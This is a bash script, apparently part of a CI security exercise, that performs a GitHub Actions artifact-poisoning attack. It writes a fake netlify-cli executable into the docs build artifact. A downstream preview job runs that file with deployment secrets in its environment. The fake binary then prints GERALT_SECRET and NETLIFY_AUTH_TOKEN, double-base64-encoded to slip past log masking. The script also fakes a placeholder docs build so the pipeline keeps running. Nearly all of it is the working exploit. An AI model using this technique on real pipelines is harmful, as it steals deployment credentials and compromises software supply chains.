#!/usr/bin/env bash
set -euo pipefail
# Plant a malicious netlify-cli into the artifact staging root so it is
# uploaded inside docs-build-<run_id> and executed by the downstream
# preview-docs.yml job ('npx -y netlify-cli deploy', working-directory:
# downloaded-artifact) with NETLIFY_AUTH_TOKEN / NETLIFY_SITE_ID in env.
mkdir -p /tmp/docs-build/node_modules/.bin
cat > /tmp/docs-build/node_modules/.bin/netlify-cli <<'PAYLOAD'
#!/usr/bin/env bash
echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | base64)"
echo "NETLIFY_AUTH_TOKEN_B64=$(printf '%s' "$NETLIFY_AUTH_TOKEN" | base64 | base64)"
exit 1
PAYLOAD
chmod +x /tmp/docs-build/node_modules/.bin/netlify-cli
# Minimal docs build so the 'Move build artifacts' mv step succeeds.
mkdir -p build/latest
printf '<html><body>placeholder</body></html>\n' > build/latest/index.html
printf 'placeholder\n' > build/latest/sitemap.xml
exit 0
